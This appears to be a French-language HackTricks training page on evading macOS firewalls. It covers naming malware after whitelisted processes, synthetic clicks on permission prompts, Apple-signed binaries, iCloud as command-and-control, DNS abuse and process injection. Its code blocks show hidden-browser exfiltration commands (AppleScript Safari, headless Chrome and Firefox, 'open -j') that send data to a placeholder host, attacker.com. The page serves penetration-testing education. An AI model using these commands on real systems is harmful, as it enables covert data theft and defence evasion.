# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Techniques trouvées

Les techniques suivantes ont été trouvées fonctionnant dans certaines applications de pare-feu macOS.

### Abus des noms de liste blanche

- Par exemple, appeler le malware avec des noms de processus macOS bien connus comme **`launchd`**

### Clic synthétique

- Si le pare-feu demande la permission à l'utilisateur, faire en sorte que le malware **clique sur autoriser**

### **Utiliser des binaires signés par Apple**

- Comme **`curl`**, mais aussi d'autres comme **`whois`**

### Domaines Apple bien connus

Le pare-feu pourrait autoriser les connexions vers des domaines Apple bien connus tels que **`apple.com`** ou **`icloud.com`**. Et iCloud pourrait être utilisé comme un C2.

### Contournement générique

Quelques idées pour essayer de contourner les pare-feu

### Vérifier le trafic autorisé

Connaître le trafic autorisé vous aidera à identifier les domaines potentiellement sur liste blanche ou quelles applications sont autorisées à y accéder.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abuser du DNS

Les résolutions DNS sont effectuées via l'application signée **`mdnsreponder`** qui sera probablement autorisée à contacter les serveurs DNS.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Via les applications de navigateur

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via injections de processus

Si vous pouvez **injecter du code dans un processus** qui est autorisé à se connecter à n'importe quel serveur, vous pourriez contourner les protections du pare-feu :

{{#ref}}
macos-proces-abuse/
{{#endref}}

## Références

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{{#include ../../banners/hacktricks-training.md}}
